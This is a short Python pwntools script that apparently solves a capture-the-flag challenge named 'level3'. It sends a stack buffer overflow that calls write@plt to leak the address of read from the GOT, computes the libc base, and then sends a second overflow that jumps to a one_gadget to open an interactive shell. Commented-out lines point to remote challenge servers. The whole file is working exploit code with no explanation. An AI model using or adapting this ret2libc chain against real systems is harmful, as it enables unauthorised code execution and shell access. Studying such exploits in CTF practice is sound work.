from pwn import *
# from LibcSearcher import *

context.log_level = "debug"
elf = ELF('level3')
main_addr = 0x08048484
io= process('./level3')
libc=ELF('/lib/i386-linux-gnu/libc-2.23.so')
#r = remote('111.198.29.45',34924)
# r = remote("node3.buuoj.cn",27114)
gdb.attach(io,'b *0x0804847E')


pay='a'*0x8c+p32(elf.plt['write'])+p32(main_addr)+p32(1)+p32(elf.got['read'])+p32(4)

io.send(pay)
libc_base=u32(io.recvuntil('\xf7')[-4:])-libc.sym['read']
libc.address=libc_base
one=libc_base+0x3ac6c
system_addr=libc.sym['system']
bin_sh_addr=libc.search('/bin/sh\x00').next()
pay='a'*0x8c+p32(one)
io.recv()
io.send(pay)



# success('libc_base:'+hex(libc_base))


io.interactive()
